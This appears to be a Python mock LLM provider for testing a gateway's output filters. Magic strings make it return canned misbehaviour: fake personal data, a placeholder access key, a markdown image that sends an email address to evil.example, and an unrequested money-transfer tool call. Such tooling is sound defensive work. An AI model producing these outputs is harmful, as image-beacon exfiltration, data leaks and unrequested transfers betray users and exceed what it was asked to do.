"""Deterministic fake LLM for tests and offline demos. Magic strings in the last user message
trigger canned answers so output checks can be exercised without a real model."""

import json
import math
import time
from typing import Any

from app.core.ids import ulid

CANNED = {
    "__LEAK_PII__": "Sure! Anna Schmidt, email anna.schmidt@example.com, IBAN DE89 3704 0044 0532 0130 00, phone +49 151 23456789.",
    "__LEAK_SECRET__": "The deployment key is AKIAIOSFODNN7EXAMPLE, keep it safe.",
    "__EXFIL__": "Done! ![status](https://evil.example/pixel.png?data=anna.schmidt%40example.com)",
    "__BANNED__": "The merger plan is confidential until Q3.",
}


def _estimate_tokens(text: str) -> int:
    return max(1, math.ceil(len(text) / 4))


def _last_user_text(body: dict[str, Any]) -> str:
    for message in reversed(body.get("messages") or []):
        if message.get("role") == "user":
            content = message.get("content")
            if isinstance(content, list):
                return " ".join(p.get("text", "") for p in content if isinstance(p, dict))
            return content or ""
    return ""


class MockProvider:
    name = "mock"

    async def chat(self, body: dict[str, Any]) -> dict[str, Any]:
        prompt = _last_user_text(body)
        if "__TOOL_CALL__" in prompt:  # the model "decides" to move money: exercises the output tool-call check
            return self._tool_call_response(body, "transfer_money", {"to_iban": "GB82WEST12345698765432", "amount": 5000})
        answer = next((text for magic, text in CANNED.items() if magic in prompt), f"Echo: {prompt}")
        prompt_tokens = sum(_estimate_tokens(str(m.get("content") or "")) for m in body.get("messages") or [])
        completion_tokens = _estimate_tokens(answer)
        return {
            "id": f"chatcmpl-mock-{ulid()}",
            "object": "chat.completion",
            "created": int(time.time()),
            "model": body.get("model", "mock"),
            "choices": [{"index": 0, "message": {"role": "assistant", "content": answer}, "finish_reason": "stop"}],
            "usage": {"prompt_tokens": prompt_tokens, "completion_tokens": completion_tokens, "total_tokens": prompt_tokens + completion_tokens},
        }

    async def status(self) -> str:
        return "mock"

    def _tool_call_response(self, body: dict[str, Any], name: str, arguments: dict[str, Any]) -> dict[str, Any]:
        call = {"id": f"call_{ulid()}", "type": "function", "function": {"name": name, "arguments": json.dumps(arguments)}}
        return {
            "id": f"chatcmpl-mock-{ulid()}",
            "object": "chat.completion",
            "created": int(time.time()),
            "model": body.get("model", "mock"),
            "choices": [{"index": 0, "message": {"role": "assistant", "content": None, "tool_calls": [call]}, "finish_reason": "tool_calls"}],
            "usage": {"prompt_tokens": 10, "completion_tokens": 10, "total_tokens": 20},
        }
